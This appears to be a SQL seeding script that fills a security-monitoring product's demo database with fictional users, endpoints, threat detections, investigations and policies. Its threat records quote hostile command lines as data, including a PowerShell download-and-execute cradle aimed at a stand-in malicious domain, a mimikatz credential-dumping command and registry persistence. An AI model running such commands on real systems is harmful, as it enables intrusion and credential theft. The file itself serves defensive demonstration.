-- WatchLockAI Database Seeding Script
-- This script populates the database with realistic sample data for demonstration

-- Insert sample organization
INSERT INTO organizations (id, name, slug, domain, plan_type, settings, created_at, updated_at) VALUES 
('org_demo_001', 'Acme Corporation', 'acme-corp', 'acme.com', 'enterprise', 
  '{"timezone": "UTC", "retention_days": 90, "alert_threshold": "medium"}', 
  NOW() - INTERVAL '30 days', NOW());

-- Insert sample user profiles
INSERT INTO user_profiles (id, organization_id, email, full_name, role, department, phone, last_login, preferences, created_at, updated_at) VALUES 
('user_admin_001', 'org_demo_001', 'admin@acme.com', 'Sarah Johnson', 'admin', 'IT Security', '+1-555-0100', NOW() - INTERVAL '1 hour', 
  '{"theme": "dark", "notifications": true, "dashboard_refresh": 30}', NOW() - INTERVAL '25 days', NOW()),
('user_analyst_001', 'org_demo_001', 'analyst@acme.com', 'Mike Chen', 'analyst', 'SOC Team', '+1-555-0101', NOW() - INTERVAL '2 hours', 
  '{"theme": "light", "notifications": true, "dashboard_refresh": 15}', NOW() - INTERVAL '20 days', NOW()),
('user_viewer_001', 'org_demo_001', 'viewer@acme.com', 'Emma Rodriguez', 'viewer', 'Compliance', '+1-555-0102', NOW() - INTERVAL '1 day', 
  '{"theme": "light", "notifications": false, "dashboard_refresh": 60}', NOW() - INTERVAL '15 days', NOW());

-- Insert sample agents
INSERT INTO agents (id, organization_id, hostname, ip_address, os_type, os_version, status, agent_version, last_heartbeat, cpu_usage, memory_usage, disk_usage, deployment_date, location, user_account, created_at, updated_at) VALUES 
('ag_wks_001', 'org_demo_001', 'DESKTOP-ABC123', '192.168.1.105', 'Windows 11', '22H2', 'online', '1.2.3', NOW() - INTERVAL '2 minutes', 23, 45, 67, NOW() - INTERVAL '25 days', 'Office - Floor 2', 'jdoe', NOW() - INTERVAL '25 days', NOW()),
('ag_wks_002', 'org_demo_001', 'LAPTOP-DEF456', '192.168.1.78', 'Windows 10', '19045', 'online', '1.2.3', NOW() - INTERVAL '5 minutes', 15, 38, 52, NOW() - INTERVAL '20 days', 'Remote Worker', 'admin', NOW() - INTERVAL '20 days', NOW()),
('ag_srv_003', 'org_demo_001', 'SRV-FILESERVER01', '192.168.1.50', 'Windows Server 2022', '21H2', 'online', '1.2.3', NOW() - INTERVAL '1 minute', 8, 62, 78, NOW() - INTERVAL '60 days', 'Data Center - Rack 3', 'SYSTEM', NOW() - INTERVAL '60 days', NOW()),
('ag_wks_004', 'org_demo_001', 'UBUNTU-WS-001', '192.168.1.125', 'Ubuntu', '22.04.3 LTS', 'offline', '1.2.2', NOW() - INTERVAL '2 hours', NULL, NULL, NULL, NOW() - INTERVAL '3 days', 'Dev Lab - Station 4', 'developer', NOW() - INTERVAL '3 days', NOW()),
('ag_srv_005', 'org_demo_001', 'DC01-CONTROLLER', '192.168.1.10', 'Windows Server 2019', '1809', 'online', '1.2.3', NOW() - INTERVAL '30 seconds', 12, 55, 35, NOW() - INTERVAL '90 days', 'Data Center - Rack 1', 'SYSTEM', NOW() - INTERVAL '90 days', NOW()),
('ag_wks_006', 'org_demo_001', 'MAC-DESIGNER01', '192.168.1.201', 'macOS', '14.2.1', 'online', '1.2.1', NOW() - INTERVAL '3 minutes', 28, 71, 63, NOW() - INTERVAL '10 days', 'Creative Suite - Room B', 'designer', NOW() - INTERVAL '10 days', NOW());

-- Insert sample threats
INSERT INTO threats (id, organization_id, agent_id, title, description, severity, status, threat_type, threat_score, first_seen, last_seen, source_ip, destination_ip, process_name, file_path, user_account, command_line, mitre_techniques, indicators, metadata, created_at, updated_at) VALUES 
('th_001', 'org_demo_001', 'ag_wks_001', 'Suspicious PowerShell Execution', 
  'PowerShell script detected attempting to download and execute malicious payload from external domain', 
  'critical', 'open', 'Malware', 95, NOW() - INTERVAL '2 hours', NOW() - INTERVAL '1 hour 45 minutes', 
  '192.168.1.105', '185.234.72.19', 'powershell.exe', 
  'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'DESKTOP-ABC123\\jdoe', 
  'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex (iwr ''http://malicious-domain.com/payload.ps1'').Content"', 
  '["T1059.001", "T1105", "T1140"]', 
  '["malicious-domain.com", "payload.ps1", "ExecutionPolicy Bypass"]',
  '{"confidence": 0.95, "alert_id": "ALT-2025-001"}', NOW() - INTERVAL '2 hours', NOW()),
  
('th_002', 'org_demo_001', 'ag_srv_003', 'Ransomware File Encryption Activity', 
  'Rapid file modification pattern detected consistent with ransomware encryption behavior', 
  'critical', 'investigating', 'Ransomware', 98, NOW() - INTERVAL '3 hours', NOW() - INTERVAL '2 hours 15 minutes', 
  '192.168.1.50', NULL, 'encrypt_files.exe', 'C:\\Temp\\encrypt_files.exe', 'NT AUTHORITY\\SYSTEM', 
  'encrypt_files.exe --target C:\\Users --extension .locked', 
  '["T1486", "T1027", "T1083"]', 
  '["encrypt_files.exe", ".locked", "rapid_file_changes"]',
  '{"confidence": 0.98, "alert_id": "ALT-2025-002", "files_affected": 1247}', NOW() - INTERVAL '3 hours', NOW()),
  
('th_003', 'org_demo_001', 'ag_wks_002', 'Credential Dumping Attempt', 
  'LSASS memory access detected indicating potential credential harvesting', 
  'high', 'open', 'Credential Access', 85, NOW() - INTERVAL '4 hours', NOW() - INTERVAL '4 hours', 
  '192.168.1.78', NULL, 'mimikatz.exe', 'C:\\Users\\admin\\Downloads\\mimikatz.exe', 'DOMAIN\\admin', 
  'mimikatz.exe privilege::debug sekurlsa::logonpasswords', 
  '["T1003.001", "T1055"]', 
  '["mimikatz.exe", "lsass.exe", "privilege::debug"]',
  '{"confidence": 0.85, "alert_id": "ALT-2025-003"}', NOW() - INTERVAL '4 hours', NOW()),
  
('th_004', 'org_demo_001', 'ag_wks_001', 'Suspicious Network Traffic', 
  'Unusual outbound traffic to known C2 infrastructure detected', 
  'medium', 'open', 'Command and Control', 72, NOW() - INTERVAL '5 hours', NOW() - INTERVAL '30 minutes', 
  '192.168.1.105', '23.95.67.142', 'chrome.exe', 
  'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', 'DESKTOP-ABC123\\jdoe', NULL, 
  '["T1071.001", "T1573"]', 
  '["23.95.67.142", "c2_domain", "encrypted_traffic"]',
  '{"confidence": 0.72, "alert_id": "ALT-2025-004", "bytes_transferred": 52341}', NOW() - INTERVAL '5 hours', NOW()),
  
('th_005', 'org_demo_001', 'ag_wks_006', 'Registry Persistence Mechanism', 
  'Suspicious registry modification detected for persistence establishment', 
  'medium', 'resolved', 'Persistence', 68, NOW() - INTERVAL '1 day', NOW() - INTERVAL '1 day', 
  '192.168.1.201', NULL, 'reg.exe', 'C:\\Windows\\System32\\reg.exe', 'MAC-DESIGNER01\\designer', 
  'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityUpdate /d C:\\temp\\update.exe', 
  '["T1547.001"]', 
  '["registry_run_key", "persistence", "SecurityUpdate"]',
  '{"confidence": 0.68, "alert_id": "ALT-2025-005"}', NOW() - INTERVAL '1 day', NOW() - INTERVAL '2 hours');

-- Insert sample investigations
INSERT INTO investigations (id, organization_id, title, description, status, priority, assigned_to, threat_ids, evidence_artifacts, timeline, findings, created_by, created_at, updated_at) VALUES 
('inv_001', 'org_demo_001', 'Ransomware Incident Response', 
  'Investigation into the ransomware attack detected on SRV-FILESERVER01', 
  'active', 'critical', 'user_analyst_001', '["th_002"]', 
  '["memory_dump_srv003.bin", "network_traffic_analysis.pcap", "file_system_timeline.csv"]',
  '[{"timestamp": "2025-01-08T07:15:00Z", "event": "Initial detection of rapid file changes"}, {"timestamp": "2025-01-08T07:30:00Z", "event": "Quarantine initiated"}, {"timestamp": "2025-01-08T08:00:00Z", "event": "Investigation started"}]',
  'Preliminary analysis suggests patient zero was external email attachment. Investigating potential lateral movement.',
  'user_admin_001', NOW() - INTERVAL '3 hours', NOW()),
  
('inv_002', 'org_demo_001', 'Credential Theft Analysis', 
  'Analysis of suspected credential dumping activity on LAPTOP-DEF456', 
  'completed', 'high', 'user_analyst_001', '["th_003"]', 
  '["process_memory_dump.bin", "registry_analysis.txt", "user_activity_log.json"]',
  '[{"timestamp": "2025-01-08T06:22:00Z", "event": "Mimikatz execution detected"}, {"timestamp": "2025-01-08T06:25:00Z", "event": "User credentials potentially compromised"}, {"timestamp": "2025-01-08T07:00:00Z", "event": "Password reset enforced"}]',
  'Investigation confirmed credential dumping attempt. User password was reset and MFA enforced. No evidence of lateral movement.',
  'user_admin_001', NOW() - INTERVAL '4 hours', NOW() - INTERVAL '1 hour');

-- Insert sample incident responses
INSERT INTO incident_responses (id, organization_id, threat_id, investigation_id, response_type, status, actions_taken, automation_used, response_time_minutes, effectiveness_score, assigned_to, created_by, created_at, updated_at) VALUES 
('resp_001', 'org_demo_001', 'th_002', 'inv_001', 'isolation', 'completed', 
  '["Isolated affected server", "Initiated backup restoration", "Notified stakeholders", "Deployed additional monitoring"]',
  true, 15, 9, 'user_analyst_001', 'user_admin_001', NOW() - INTERVAL '3 hours', NOW() - INTERVAL '2 hours'),
  
('resp_002', 'org_demo_001', 'th_003', 'inv_002', 'containment', 'completed', 
  '["Reset user credentials", "Enabled MFA", "Revoked active sessions", "Increased monitoring"]',
  false, 45, 8, 'user_analyst_001', 'user_admin_001', NOW() - INTERVAL '4 hours', NOW() - INTERVAL '1 hour'),
  
('resp_003', 'org_demo_001', 'th_001', NULL, 'blocking', 'in_progress', 
  '["Blocked malicious domain", "Quarantined affected endpoint", "Running additional scans"]',
  true, NULL, NULL, 'user_analyst_001', 'user_admin_001', NOW() - INTERVAL '2 hours', NOW());

-- Insert sample policies
INSERT INTO policies (id, organization_id, name, description, policy_type, rules, is_active, applied_agents, compliance_frameworks, created_by, created_at, updated_at) VALUES 
('pol_001', 'org_demo_001', 'Anti-Malware Protection', 
  'Comprehensive malware detection and prevention policy', 
  'detection', 
  '{"real_time_scanning": true, "quarantine_suspicious": true, "update_frequency": "hourly", "exclusions": ["/opt/safe_app"]}',
  true, '["ag_wks_001", "ag_wks_002", "ag_srv_003", "ag_wks_004", "ag_srv_005", "ag_wks_006"]', 
  '["NIST", "ISO27001"]', 'user_admin_001', NOW() - INTERVAL '30 days', NOW()),
  
('pol_002', 'org_demo_001', 'PowerShell Monitoring', 
  'Enhanced monitoring and logging of PowerShell execution', 
  'monitoring', 
  '{"log_level": "verbose", "blocked_cmdlets": ["Invoke-Expression", "Invoke-WebRequest"], "alert_on_encoded": true}',
  true, '["ag_wks_001", "ag_wks_002", "ag_wks_006"]', 
  '["NIST"]', 'user_admin_001', NOW() - INTERVAL '20 days', NOW()),
  
('pol_003', 'org_demo_001', 'Network Traffic Analysis', 
  'Monitor and analyze network traffic for suspicious patterns', 
  'network', 
  '{"deep_packet_inspection": true, "c2_detection": true, "bandwidth_monitoring": true, "blocked_domains": ["malicious-domain.com"]}',
  true, '["ag_wks_001", "ag_wks_002", "ag_srv_003", "ag_srv_005", "ag_wks_006"]', 
  '["NIST", "SOC2"]', 'user_admin_001', NOW() - INTERVAL '15 days', NOW());

-- Insert sample integrations
INSERT INTO integrations (id, organization_id, name, integration_type, provider, configuration, is_active, last_sync, health_status, created_by, created_at, updated_at) VALUES 
('int_001', 'org_demo_001', 'Splunk SIEM', 'siem', 'Splunk', 
  '{"endpoint": "https://splunk.acme.com:8089", "index": "security", "auth_method": "token"}',
  true, NOW() - INTERVAL '5 minutes', 'healthy', 'user_admin_001', NOW() - INTERVAL '25 days', NOW()),
  
('int_002', 'org_demo_001', 'Microsoft Defender', 'edr', 'Microsoft', 
  '{"tenant_id": "acme-corp", "api_version": "v1.0", "sync_frequency": "15min"}',
  true, NOW() - INTERVAL '10 minutes', 'healthy', 'user_admin_001', NOW() - INTERVAL '20 days', NOW()),
  
('int_003', 'org_demo_001', 'Threat Intelligence Feed', 'threat_intel', 'CyberThreat Intel Corp', 
  '{"feed_url": "https://api.threatintel.com/v2/iocs", "update_frequency": "hourly", "confidence_threshold": 0.7}',
  false, NOW() - INTERVAL '2 hours', 'error', 'user_admin_001', NOW() - INTERVAL '10 days', NOW() - INTERVAL '1 hour');

-- Insert sample reports
INSERT INTO reports (id, organization_id, title, report_type, parameters, status, file_path, scheduled, frequency, recipients, created_by, created_at, updated_at) VALUES 
('rpt_001', 'org_demo_001', 'Weekly Security Summary', 'executive', 
  '{"time_range": "7d", "include_trends": true, "threat_breakdown": true, "agent_health": true}',
  'completed', '/reports/weekly_summary_2025_01_01.pdf', true, 'weekly', 
  '["admin@acme.com", "ciso@acme.com"]', 'user_admin_001', NOW() - INTERVAL '7 days', NOW() - INTERVAL '7 days'),
  
('rpt_002', 'org_demo_001', 'Monthly Compliance Report', 'compliance', 
  '{"time_range": "30d", "frameworks": ["NIST", "ISO27001"], "include_gaps": true}',
  'completed', '/reports/compliance_2024_12.pdf', true, 'monthly', 
  '["admin@acme.com", "compliance@acme.com"]', 'user_admin_001', NOW() - INTERVAL '8 days', NOW() - INTERVAL '8 days'),
  
('rpt_003', 'org_demo_001', 'Threat Landscape Analysis', 'technical', 
  '{"time_range": "30d", "threat_types": ["malware", "ransomware"], "mitre_mapping": true}',
  'generating', NULL, false, NULL, '["analyst@acme.com"]', 'user_analyst_001', NOW() - INTERVAL '1 hour', NOW());

-- Insert sample audit logs
INSERT INTO audit_logs (id, organization_id, user_id, action, resource_type, resource_id, details, ip_address, user_agent, created_at) VALUES 
('aud_001', 'org_demo_001', 'user_admin_001', 'investigation_created', 'investigation', 'inv_001', 
  '{"investigation_title": "Ransomware Incident Response", "priority": "critical"}', 
  '192.168.1.200', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', NOW() - INTERVAL '3 hours'),
  
('aud_002', 'org_demo_001', 'user_analyst_001', 'threat_status_updated', 'threat', 'th_002', 
  '{"old_status": "open", "new_status": "investigating"}', 
  '192.168.1.201', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', NOW() - INTERVAL '2 hours'),
  
('aud_003', 'org_demo_001', 'user_admin_001', 'policy_created', 'policy', 'pol_003', 
  '{"policy_name": "Network Traffic Analysis", "policy_type": "network"}', 
  '192.168.1.200', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', NOW() - INTERVAL '15 days'),
  
('aud_004', 'org_demo_001', 'user_analyst_001', 'login', 'user_session', 'user_analyst_001', 
  '{"login_method": "password", "mfa_used": true}', 
  '192.168.1.201', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', NOW() - INTERVAL '2 hours'),
  
('aud_005', 'org_demo_001', 'user_admin_001', 'integration_updated', 'integration', 'int_003', 
  '{"integration_name": "Threat Intelligence Feed", "action": "disabled", "reason": "API errors"}', 
  '192.168.1.200', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', NOW() - INTERVAL '1 hour');
